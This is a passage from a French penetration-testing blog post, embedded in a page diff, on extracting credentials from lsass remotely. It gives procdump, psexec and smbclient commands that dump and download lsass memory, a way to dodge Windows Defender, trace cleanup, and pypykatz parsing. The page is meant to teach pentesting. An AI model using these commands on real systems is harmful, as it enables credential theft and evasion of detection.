@@ -1,0 +1,708 @@
+<!doctype html>
+<html lang="fr-fr" class="no-js">
+
+  <head>
+    <link href="http://gmpg.org/xfn/11" rel="profile" hreflang="fr">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  
+    <meta name="google-site-verification" content="JeRPv2CEcpONAy8C7dMr1nzjlpZxlxYCtt2PnuQ78g8" />
+    <!-- Enable responsiveness on mobile devices-->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  
+    <title>
+      
+        Extraction des secrets de lsass à distance - hackndo
+      
+    </title>
+
+	<link rel="stylesheet" href="/assets/css/style.css?v=1.13"> <!-- Resource style -->
+    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Signika:600"> <!-- Logo font -->
+    <script src="/assets/js/modernizr.js"></script> <!-- Modernizr -->
+    
+    <link rel="apple-touch-icon" sizes="57x57" href="/assets/icones/favicon/apple-icon-57x57.png">
+    <link rel="apple-touch-icon" sizes="60x60" href="/assets/icones/favicon/apple-icon-60x60.png">
+    <link rel="apple-touch-icon" sizes="72x72" href="/assets/icones/favicon/apple-icon-72x72.png">
+    <link rel="apple-touch-icon" sizes="76x76" href="/assets/icones/favicon/apple-icon-76x76.png">
+    <link rel="apple-touch-icon" sizes="114x114" href="/assets/icones/favicon/apple-icon-114x114.png">
+    <link rel="apple-touch-icon" sizes="120x120" href="/assets/icones/favicon/apple-icon-120x120.png">
+    <link rel="apple-touch-icon" sizes="144x144" href="/assets/icones/favicon/apple-icon-144x144.png">
+    <link rel="apple-touch-icon" sizes="152x152" href="/assets/icones/favicon/apple-icon-152x152.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="/assets/icones/favicon/apple-icon-180x180.png">
+    <link rel="icon" type="image/png" sizes="192x192"  href="/assets/icones/favicon/android-icon-192x192.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/assets/icones/favicon/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="96x96" href="/assets/icones/favicon/favicon-96x96.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/assets/icones/favicon/favicon-16x16.png">
+    <link rel="manifest" href="/assets/res/manifest.json">
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="msapplication-TileImage" content="/assets/icones/favicon/ms-icon-144x144.png">
+    <meta name="theme-color" content="#ffffff">
+  	
+	<!-- RSS -->
+    <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="hackndo" />
+
+    <!-- Twitter card -->
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:site" content="@hackanddo" />
+    <meta name="twitter:creator" content="@hackanddo" />
+    <meta name="twitter:title" content="Extraction des secrets de lsass à distance" />
+    <meta name="twitter:description" content="Cet article présente la modification d'un outil pour extraire à distance les mots de passe présents dans un dump de lsass, évitant ainsi d'utiliser Mimikatz et d'être détecté par les Antivirus" />
+    
+    <meta name="twitter:image" content="http://localhost:4000/assets/uploads/2019/11/procdump.png" />
+    
+  
+    <!-- Google analytics -->
+    <script>
+      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+      })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  
+      ga('create', 'UA-80312745-1', 'auto');
+      ga('send', 'pageview');
+  
+    </script>
+    <!-- Begin Jekyll SEO tag v2.6.1 -->
+<meta name="generator" content="Jekyll v4.0.0" />
+<meta property="og:title" content="Extraction des secrets de lsass à distance" />
+<meta name="author" content="Pixis" />
+<meta property="og:locale" content="fr_FR" />
+<meta name="description" content="Cet article présente la modification d’un outil pour extraire à distance les mots de passe présents dans un dump de lsass, évitant ainsi d’utiliser Mimikatz et d’être détecté par les Antivirus" />
+<meta property="og:description" content="Cet article présente la modification d’un outil pour extraire à distance les mots de passe présents dans un dump de lsass, évitant ainsi d’utiliser Mimikatz et d’être détecté par les Antivirus" />
+<link rel="canonical" href="http://localhost:4000/remote-lsass-dump-passwords/" />
+<meta property="og:url" content="http://localhost:4000/remote-lsass-dump-passwords/" />
+<meta property="og:site_name" content="hackndo" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2019-11-28T23:40:00+01:00" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/icones/logo.png"},"name":"Pixis"},"url":"http://localhost:4000/remote-lsass-dump-passwords/","headline":"Extraction des secrets de lsass à distance","dateModified":"2019-11-28T23:40:00+01:00","datePublished":"2019-11-28T23:40:00+01:00","author":{"@type":"Person","name":"Pixis"},"description":"Cet article présente la modification d’un outil pour extraire à distance les mots de passe présents dans un dump de lsass, évitant ainsi d’utiliser Mimikatz et d’être détecté par les Antivirus","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/remote-lsass-dump-passwords/"},"@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+  <body>
+    <header class="cd-main-header">
+    <a href="/" class="cd-logo"><img src="/assets/icones/logo.png" /> <span class="cd-logo-title">hackndo</span></a>
+		
+    <a href="#0" class="cd-nav-trigger">Menu<span></span></a>
+
+</header> <!-- .cd-main-header -->
+    <main class="cd-main-content">
+		<nav class="cd-side-nav">
+            <div class="sidebar-about">
+    <h1>
+        <img id="site-logo" src="/assets/icones/logo.png" alt="logo" title="logo" />
+        <a class="sidebar-title" href="/">
+        hackndo
+        </a>
+    </h1>
+    <p class="lead">Think out of the box</p>
+</div>
+
+<ul>
+    <li class="cd-label">Blog</li>
+    <li class="">
+        <a href="/">Home</a>
+    </li>
+    
+    
+        
+            
+        
+    
+        
+            
+                <li class="">
+                    <a href="/about/">À propos</a>
+                </li>
+            
+        
+    
+        
+            
+                <li class="">
+                    <a href="/archives/">Archives</a>
+                </li>
+            
+        
+    
+        
+            
+                <li class="">
+                    <a href="/contact/">Me contacter</a>
+                </li>
+            
+        
+    
+        
+            
+                <li class="">
+                    <a href="/disclaimer/">Disclaimer</a>
+                </li>
+            
+        
+    
+        
+    
+        
+            
+        
+    
+        
+            
+                <li class="">
+                    <a href="/projects/">Projets</a>
+                </li>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+    
+        
+    
+</ul>
+<ul>
+    <li class="cd-label">Liens</li>
+    <li><a href="https://www.dailysecurity.fr/" target="_blank">Blog de Geluchat</a></li>
+    <li><a href="http://lsdsecdaemon.com" target="_blank">Blog de Th3_l5D</a></li>
+    <li><a href="http://inf0sec.fr" target="_blank">Blog de Matthieu</a></li>
+</ul>
+<p class="sidebar-copyright">&copy; 2019. Tous droits réservés.</p>
+<div class="sidebar-social">
+<ul>
+  <li><a href="https://twitter.com/HackAndDo" title="Twitter" target="_blank"><img alt="Twitter" title="Twitter" src="/assets/icones/social/twitter.png" /></a></li>
+  <li><a href="https://github.com/hackndo" title="Github" target="_blank"><img title="Github" alt="Github" src="/assets/icones/social/github.png" /></a></li>
+  <li><a href="https://www.youtube.com/channel/UC9WYWHLdu9TK-0Hu3wcHJ9g" title="Youtube" target="_blank"><img title="Youtube" alt="Youtube" src="/assets/icones/social/youtube.png" /></a></li>
+  <li><a href="https://discord.gg/9At6SUZ" title="Discord" target="_blank"><img title="Discord" alt="Discord" src="/assets/icones/social/discord.png" /></a></li>
+  <li><a href="https://www.linkedin.com/in/romainbentz/" title="LinkedIn" target="_blank"><img title="LinkedIn" alt="LinkedIn" src="/assets/icones/social/linkedin.png" /></a></li>
+  <li><a href="https://sh.hackndo.com" title="Shell" target="_blank"><img title="Shell" alt="Shell" src="/assets/icones/social/shell.png" /></a></li>
+  <li><a href="/feed.xml" title="RSS" target="_blank"><img title="RSS" alt="RSS" src="/assets/icones/social/rss.png" /></a></li>
+  <li><a href="https://ko-fi.com/hackndo" title="Ko-Fi" target="_blank"><img title="Ko-Fi" alt="Ko-Fi" src="/assets/icones/social/kofi.gif" /></a></li>
+</ul>
+</div>
+        </nav>
+
+        <div class="content-wrapper">
+            <div class="post">
+  
+  <div class="post-cover">
+    <img src="/assets/uploads/2019/11/procdump.png" alt="Extraction des secrets de lsass à distance" title="Extraction des secrets de lsass à distance" />
+  </div>
+  
+  <h1 class="post-title">Extraction des secrets de lsass à distance</h1>
+  <div class="post-info">
+      <p class="alignleft">28 Nov 2019 <a class="post-comments-count" href="http://http://localhost:4000/remote-lsass-dump-passwords/#disqus_thread"></a></p>
+      <p class="alignright">Auteur : <strong><a href="https://twitter.com/HackAndDo">Pixis</a></strong></p>
+      <div class="keywords">
+        <span class="post-tags"><a href="/archives/#active-directory"><i class="fas fa-tags"></i> Active Directory</a><a href="/archives/#windows"><i class="fas fa-tags"></i> Windows</a></span>
+      </div>
+</div>
+
+  <article>
+  <p>Lors de tests d’intrusion en entreprise, le mouvement latéral et l’élévation de privilèges sont deux concepts fondamentaux pour avancer et prendre le contrôle de la cible. Il existe une multitude de moyens de faire l’un ou l’autre, mais aujourd’hui nous allons présenter une nouvelle technique pour lire le contenu d’un dump de lsass à distance, diminuant significativement la latence et la détection lors de l’extraction de mots de passe sur un ensemble de machines.</p>
+
+<!--more-->
+
+<h2 id="introduction">Introduction</h2>
+
+<p>Un petit message d’introduction pour remercier <a href="https://twitter.com/mpgn_x64">mpgn</a> qui m’a beaucoup aidé sur différents sujets, et avec qui je travaille en partie sur ce projet, et <a href="https://twitter.com/skelsec">Skelsec</a> pour ses conseils et ses idées.</p>
+
+<h2 id="crackmapexec">CrackMapExec</h2>
+
+<p>L’outil <a href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a> est développé et maintenu par <a href="https://twitter.com/byt3bl33d3r">Byt3bl33d3r</a>. Son utilité est de pouvoir exécuter des actions sur un ensemble de machines de manière asynchrone, donc relativement rapidement. L’outil permet de s’authentifier sur les machines distantes avec un compte de domaine, un compte local, et un password ou un hash, donc via la technique de “Pass the hash”.</p>
+
+<p>CrackMapExec a été développé de manière modulaire. Il est possible de créer ses propres modules que l’outil exécutera lorsqu’il se connectera à une machine. Il en existe déjà beaucoup, comme l’énumération d’informations (DNS, Chrome, AntiVirus), l’exécution de BloodHound ou encore la recherche de mots de passe dans les “Group Policy Preferences”.</p>
+
+<h2 id="module-mimikatz">Module Mimikatz</h2>
+
+<p>Il en existe un en particulier, qui était très efficace pendant quelques temps, c’était le module <a href="https://github.com/byt3bl33d3r/CrackMapExec/blob/master/cme/modules/mimikatz.py">Mimikatz</a>. CrackMapExec exécute Mimikatz sur les machines distantes afin d’extraire les identifiants de la mémoire de lsass ou <strong>Local Security Authority SubSystem</strong>. C’est dans ce processus que se trouvent les différents <strong>Security Service Providers</strong> ou <strong>SSP</strong>, c’est à dire les paquets qui gèrent les différents types d’authentification. Pour des raisons pratiques, les identifiants entrés par un utilisateur sont très souvent enregistrés dans l’un de ces paquets pour qu’il n’ait pas à les entrer une nouvelle fois quelques secondes ou minutes plus tard.</p>
+
+<p>C’est pourquoi Mimikatz extrait les informations situées dans ces différents SSP pour tenter de trouver des secrets d’identification, et les affiche à l’attaquant. Ainsi, si un compte à privilèges s’est connecté sur l’une des machines compromises, le module Mimikatz permet de récupérer rapidement ses identifiants et ainsi profiter des privilèges de ce compte pour compromettre plus de ressources.</p>
+
+<p>Mais aujourd’hui, la majorité des antivirus détecte la présence et/ou l’exécution de Mimikatz et le bloque. CrackMapExec a beau attendre une réponse des machines visées, l’antivirus a joué son rôle, et nous n’avons plus les secrets qui apparaissent sur notre écran.</p>
+
+<h2 id="méthode-manuelle--procdump">Méthode manuelle : Procdump</h2>
+
+<p>Suite à ce constat, je me suis tourné vers une méthode beaucoup plus manuelle mais qui a le mérite d’être fonctionnelle en utilisant l’outil <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">Procdump</a>.</p>
+
+<p>Procdump est un outil de la suite <a href="https://docs.microsoft.com/en-us/sysinternals/">Sysinternals</a> qui a été écrite par <a href="https://blogs.technet.microsoft.com/markrussinovich/">Marc Russinovich</a> pour simplifier la vie des administrateurs. Cette suite d’outils a été adoptée par un grand nombre de personnes, à tel point que Microsoft a décidé de l’acheter vers 2006, et les exécutables sont maintenant signés par Microsoft, donc reconnus comme sains par Windows.</p>
+
+<p>L’outil procdump fait donc partie de ces outils, et il permet tout simplement de faire un dump de la mémoire d’un processus en cours d’exécution. Il s’attache au processus, lit sa mémoire et la retranscrit dans un fichier.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>procdump --accepteula -ma &lt;processus&gt; processus_dump.dmp
+</code></pre></div></div>
+
+<p>Or, pour extraire les secrets des utilisateurs, Mimikatz va notamment fouiller dans la mémoire du processus <strong>lsass</strong>, comme expliqué précédemment.</p>
+
+<p>Il est alors possible de faire un dump du processus lsass sur une machine, de rapatrier ce dump sur notre machine locale, et d’extraire les identifiants à l’aide de Mimikatz.</p>
+
+<p>Pour dumper le processus lsass, nous pouvons donc utiliser l’outil procdump, puisque celui-ci est connu de Windows, et ne sera pas considéré comme un logiciel malveillant.</p>
+
+<p>Dans un premier temps, il faut l’envoyer sur le serveur, par exemple en utilisant <code class="highlighter-rouge">smbclient.py</code> de la suite <a href="https://github.com/SecureAuthCorp/impacket">impacket</a></p>
+
+<p><a href="/assets/uploads/2019/11/put_procdump.png"><img src="/assets/uploads/2019/11/put_procdump.png" alt="Put Procdump" /></a></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient.py ADSEC.LOCAL/jsnow@DC01.adsec.local
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># use C$
+# cd Windows
+# cd Temp
+# put procdump.exe
+</code></pre></div></div>
+
+<p>Une fois uploadé, il doit être exécuté afin de créer le dump de lsass.</p>
+
+<p><a href="/assets/uploads/2019/11/execute_procdump.png"><img src="/assets/uploads/2019/11/execute_procdump.png" alt="Excute Procdump" /></a></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>psexec.py adsec.local/jsnow@DC01.adsec.local <span class="s2">"C:</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">Temp</span><span class="se">\\</span><span class="s2">procdump.exe -accepteula -ma lsass C:</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">Temp</span><span class="se">\\</span><span class="s2">lsass.dmp"</span>
+</code></pre></div></div>
+
+<p>Puis le dump doit être rapatrié sur la machine de l’attaquant, suite à quoi nous pouvons supprimer les traces sur la cible (lsass.dmp et procdump.exe).</p>
+
+<p><a href="/assets/uploads/2019/11/get_procdump.png"><img src="/assets/uploads/2019/11/get_procdump.png" alt="Get Procdump" /></a></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># get lsass.dmp
+# del procdump.exe
+# del lsass.dmp
+</code></pre></div></div>
+
+<p>L’extraction des identifiants se fait de la manière suivante avec Mimikatz : la première ligne permet de charger le dump mémoire, et la deuxième d’extraire les secrets.</p>
+
+<p><a href="/assets/uploads/2019/11/mimikatz_dump.png"><img src="/assets/uploads/2019/11/mimikatz_dump.png" alt="Mimikatz Dump" /></a></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sekurlsa::minidump lsass.dmp
+sekurlsa::logonPasswords
+</code></pre></div></div>
+
+<p>Cette technique est très pratique puisqu’elle ne génère pas beaucoup de bruit et seul un logiciel légitime est utilisé sur les cibles.</p>
+
+<h2 id="limites--améliorations">Limites &amp; Améliorations</h2>
+
+<p>Il existe différentes limitations à cette méthode. Nous allons les exposer ici, et proposer des améliorations afin d’y remédier.</p>
+
+<h3 id="linux--windows">Linux / Windows</h3>
+
+<p>Le premier problème est que lors de mes tests, je suis majoritairement sur mon poste Linux, que ce soit pour les tests web ou les tests internes, et Mimikatz est un outil exclusivement développé pour Windows, de par son fonctionnement. Il serait idéal de pouvoir effectuer la chaine d’attaque décrite ci-dessus depuis un poste Linux.</p>
+
+<p>Heureusement, le projet <a href="https://github.com/skelsec/pypykatz">Pypykatz</a> de <a href="https://twitter.com/skelsec">Skelsec</a> répond à cette attente. Skelsec a développé une implémentation partielle de Mimikatz en python pur. Qui dit python pur, dit cross-plateforme. Cet outil permet notamment, comme Mimikatz, d’extraire les secrets d’un dump lsass.</p>
+
+<p><a href="/assets/uploads/2019/11/pypykatz_example.png"><img src="/assets/uploads/2019/11/pypykatz_example.png" alt="Pypykatz Example" /></a></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pypykatz lsa minidump lsass.dmp
+</code></pre></div></div>
+
+<p>Grâce à ce projet, il est possible de tout faire depuis une machine Linux. L’ensemble des étapes présentées dans le paragraphe précédent est applicable, et lorsque lsass.dmp a été téléchargé sur la machine de l’attaquant, pypykatz est utilisé pour extraire les noms d’utilisateur et mots de passe ou hash NT de ce dump.</p>
+
+<p>So far so good, let’s go deeper.</p>
+
+<h3 id="windows-defender">Windows Defender</h3>
+
+<p>Une deuxième limitation a été rencontrée, elle était due à Windows Defender. Bien que procdump soit un outil de confiance du point de vue de Windows, le fait de faire un dump de lsass est un comportement qui est considéré comme anormal par Windows Defender. Ainsi, lorsque le dump a été effectué, Windows Defender réagit et supprime le dump après quelques secondes. Si nous avons une très bonne connexion, que le dump n’est pas trop gros, et que nous sommes suffisamment rapides, il est possible de télécharger le dump avant sa suppression.</p>
+
+<p>Cependant ce comportement est trop aléatoire pour s’en contenter. En regardant la documentation de procdump, je me suis rendu compte qu’il était aussi possible de lui fournir un identifiant de process (PID). Et surprise, en lui fournissant non plus le nom mais le PID de lsass, Windows Defender ne réagit plus.</p>
+
+<p>Il suffit alors de trouver le PID du processus lsass, par exemple avec la commande <code class="highlighter-rouge">tasklist</code></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; tasklist /fi "imagename eq lsass.exe"
+
+Image Name                     PID Session Name        Session#    Mem Usage
+========================= ======== ================ =========== ============
+lsass.exe                      640 Services                   0     15,584 K
+</code></pre></div></div>
+
+<p>Puis une fois en possession de ce PID, nous le fournissons à procdump.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>procdump -accepteula -ma 640 lsass.dmp
+</code></pre></div></div>
+
+<p>Nous avons alors tout le loisir de télécharger notre dump et de l’analyser ensuite sur notre machine, comme précédemment.</p>
+
+<h3 id="méthode-manuelle">Méthode manuelle</h3>
+
+<p>Cette opération est certes pratique, mais elle reste manuelle. Nous avons parlé de CrackMapExec et de sa modularité au début de cet article, c’est pourquoi j’ai écrit un module permettant d’automatiser cette opération. Pour chaque cible fournie à CrackMapExec, si l’attaquant est administrateur local de la cible, le module va uploader procdump sur la cible, l’exécuter, récupérer le dump de lsass et va ensuite l’analyser avec pypykatz.</p>
+
+<p>Ce module fonctionne bien, mais il est long, très long à s’exécuter, et parfois le téléchargement du dump de lsass ne se termine pas car le fichier est trop volumineux. Il s’agit alors d’optimiser ce module.</p>
+
+<h3 id="taille-dun-dump">Taille d’un dump</h3>
+
+<p>Nous sommes maintenant en mesure de dumper lsass sur la machine distante et de l’analyser en local sur notre linux de manière automatique avec un nouveau module CrackMapExec. Mais un dump mémoire de processus, ce n’est pas quelques octets, ni même quelques kilo octets. Ce sont plusieurs méga octets, voire dizaines de méga octets pour lsass. Lors de mes tests, certains dumps avaient une taille de plus de 150Mo. Si nous voulons automatiser ce processus, il va falloir trouver une solution, car télécharger un dump lsass sur un sous-réseau de 200 machines amènerait à télécharger plusieurs dizaines de giga octets. D’une part ça prendra beaucoup de temps, surtout si ce sont des machines distantes, dans d’autres pays, et d’autre part un flux réseau anormal pourrait être détecté par les équipes de sécurité.</p>
+
+<p>Jusque là, nous avions des outils pour répondre à nos problèmes, mais cette fois-ci, il va falloir mettre les mains dans le moteur.</p>
+
+<p>Nous n’allons pas réinventer la roue pour autant, et nous continuerons d’utiliser pypykatz pour extraire les informations du dump de lsass. L’idée étant de n’utiliser que procdump sur la machine distante, il n’est pas envisageable d’envoyer pypykatz pour faire le travail sur la machine distante. D’une part python peut ne pas être installé, et d’autre part il est possible que pypykatz soit détecté par des antivirus.</p>
+
+<p>Ces prérequis en tête, voici la méthode que nous allons utiliser : Afin d’analyser un dump en local, pypykatz doit ouvrir le fichier et lire des octets à certains endroits. Les informations recherchées dans le dump sont présentes à certains offsets, et ne sont pas plus grandes que quelques octets, ou kilo octets. Pypykatz suit des pointeurs présents à des offsets précis afin de trouver l’information qui l’intéresse.</p>
+
+<p>L’idée est alors de lire ces offsets et ces adresses à distance, sur le dump présent sur la cible, et de ne rapatrier que les quelques morceaux de dump qui contiennent les informations attendues.</p>
+
+<p>En ce sens, regardons comment fonctionne pypykatz. La ligne de commande que nous utilisons jusqu’ici est la suivante :</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pypykatz lsa minidump lsass.dmp
+</code></pre></div></div>
+
+<p>C’est en fait la classe <code class="highlighter-rouge">LSACMDHelper</code> qui gère la partie <code class="highlighter-rouge">lsa</code>. Et lorsqu’on lui fournit un dump de lsass, c’est la méthode <code class="highlighter-rouge">run()</code> de cette classe qui est appelée. Dans cette méthode <code class="highlighter-rouge">run</code>, il y a notamment :</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">###### Minidump
+</span><span class="k">elif</span> <span class="n">args</span><span class="o">.</span><span class="n">cmd</span> <span class="o">==</span> <span class="s">'minidump'</span><span class="p">:</span>
+    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">directory</span><span class="p">:</span>
+        <span class="n">dir_fullpath</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">abspath</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">memoryfile</span><span class="p">)</span>
+        <span class="n">file_pattern</span> <span class="o">=</span> <span class="s">'*.dmp'</span>
+        <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">recursive</span> <span class="o">==</span> <span class="bp">True</span><span class="p">:</span>
+            <span class="n">globdata</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">dir_fullpath</span><span class="p">,</span> <span class="s">'**'</span><span class="p">,</span> <span class="n">file_pattern</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>	
+            <span class="n">globdata</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">dir_fullpath</span><span class="p">,</span> <span class="n">file_pattern</span><span class="p">)</span>
+            
+        <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Parsing folder </span><span class="si">%</span><span class="s">s'</span> <span class="o">%</span> <span class="n">dir_fullpath</span><span class="p">)</span>
+        <span class="k">for</span> <span class="n">filename</span> <span class="ow">in</span> <span class="n">glob</span><span class="o">.</span><span class="n">glob</span><span class="p">(</span><span class="n">globdata</span><span class="p">,</span> <span class="n">recursive</span><span class="o">=</span><span class="n">args</span><span class="o">.</span><span class="n">recursive</span><span class="p">):</span>
+            <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Parsing file </span><span class="si">%</span><span class="s">s'</span> <span class="o">%</span> <span class="n">filename</span><span class="p">)</span>
+            <span class="k">try</span><span class="p">:</span>
+                <span class="n">mimi</span> <span class="o">=</span> <span class="n">pypykatz</span><span class="o">.</span><span class="n">parse_minidump_file</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
+                <span class="n">results</span><span class="p">[</span><span class="n">filename</span><span class="p">]</span> <span class="o">=</span> <span class="n">mimi</span>
+            <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+                <span class="n">files_with_error</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
+                <span class="n">logging</span><span class="o">.</span><span class="n">exception</span><span class="p">(</span><span class="s">'Error parsing file </span><span class="si">%</span><span class="s">s '</span> <span class="o">%</span> <span class="n">filename</span><span class="p">)</span>
+                <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">halt_on_error</span> <span class="o">==</span> <span class="bp">True</span><span class="p">:</span>
+                    <span class="k">raise</span> <span class="n">e</span>
+                <span class="k">else</span><span class="p">:</span>
+                    <span class="k">pass</span>
+</code></pre></div></div>
+
+<p>On voit alors que le parsing du dump se fait à la ligne suivante :</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">mimi</span> <span class="o">=</span> <span class="n">pypykatz</span><span class="o">.</span><span class="n">parse_minidump_file</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Cette méthode est définie dans <code class="highlighter-rouge">pypykatz.py</code> :</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">minidump.minidumpfile</span> <span class="kn">import</span> <span class="n">MinidumpFile</span>
+<span class="s">"""
+&lt;snip&gt;
+"""</span>
+<span class="o">@</span><span class="nb">staticmethod</span>
+<span class="k">def</span> <span class="nf">parse_minidump_file</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">minidump</span> <span class="o">=</span> <span class="n">MinidumpFile</span><span class="o">.</span><span class="n">parse</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
+        <span class="n">reader</span> <span class="o">=</span> <span class="n">minidump</span><span class="o">.</span><span class="n">get_reader</span><span class="p">()</span><span class="o">.</span><span class="n">get_buffered_reader</span><span class="p">()</span>
+        <span class="n">sysinfo</span> <span class="o">=</span> <span class="n">KatzSystemInfo</span><span class="o">.</span><span class="n">from_minidump</span><span class="p">(</span><span class="n">minidump</span><span class="p">)</span>
+    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="n">logger</span><span class="o">.</span><span class="n">exception</span><span class="p">(</span><span class="s">'Minidump parsing error!'</span><span class="p">)</span>
+        <span class="k">raise</span> <span class="n">e</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">mimi</span> <span class="o">=</span> <span class="n">pypykatz</span><span class="p">(</span><span class="n">reader</span><span class="p">,</span> <span class="n">sysinfo</span><span class="p">)</span>
+        <span class="n">mimi</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="c1">#logger.info('Credentials parsing error!')
+</span>        <span class="n">mimi</span><span class="o">.</span><span class="n">log_basic_info</span><span class="p">()</span>
+        <span class="k">raise</span> <span class="n">e</span>
+    <span class="k">return</span> <span class="n">mimi</span>
+</code></pre></div></div>
+
+<p>C’est en fait la classe <code class="highlighter-rouge">MinidumpFile</code> du packet <code class="highlighter-rouge">minidump</code> qui gère le parsing. Il faut donc creuser un peu plus loin, et étudier <a href="https://github.com/skelsec/minidump">minidump</a>, également écrit par Skelsec.</p>
+
+<p>Dans la classe <code class="highlighter-rouge">Minidumpfile</code>, la méthode <code class="highlighter-rouge">parse</code> est la suivante :</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">@</span><span class="nb">staticmethod</span>
+<span class="k">def</span> <span class="nf">parse</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
+    <span class="n">mf</span> <span class="o">=</span> <span class="n">MinidumpFile</span><span class="p">()</span>
+    <span class="n">mf</span><span class="o">.</span><span class="n">filename</span> <span class="o">=</span> <span class="n">filename</span>
+    <span class="n">mf</span><span class="o">.</span><span class="n">file_handle</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">)</span>
+    <span class="n">mf</span><span class="o">.</span><span class="n">_parse</span><span class="p">()</span>
+	<span class="k">return</span> <span class="n">mf</span>
+</code></pre></div></div>
+
+<p>Voilà, c’est cet endroit qui nous intéresse. Le fichier que nous passons en argument est ouvert puis son contenu est analysé. Je vous passe les extraits de code, mais en suivant la méthode privée <code class="highlighter-rouge">_parse</code>, nous nous rendons compte que <code class="highlighter-rouge">minidump</code> utilise les méthodes <code class="highlighter-rouge">read</code>, <code class="highlighter-rouge">seek</code> et <code class="highlighter-rouge">tell</code> pour analyser le fichier.</p>
+
+<p>Il suffit alors de remplacer la fonction <code class="highlighter-rouge">open</code> par quelque chose que nous maitrisons afin d’ouvrir un accès vers le fichier distant, et de réécrire les méthodes <code class="highlighter-rouge">read</code>, <code class="highlighter-rouge">seek</code> et <code class="highlighter-rouge">tell</code>. Fort heureusement pour nous, la suite impacket possède des bouts de code qui nous serons très utiles.</p>
+
+<p>Voici une partie de l’implémentation de cette classe. Du code a été simplifié pour la compréhension de l’article.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">"""
+Réécriture de 'open' pour ouvrir et lire un fichier distant
+"""</span>
+<span class="k">class</span> <span class="nc">open</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
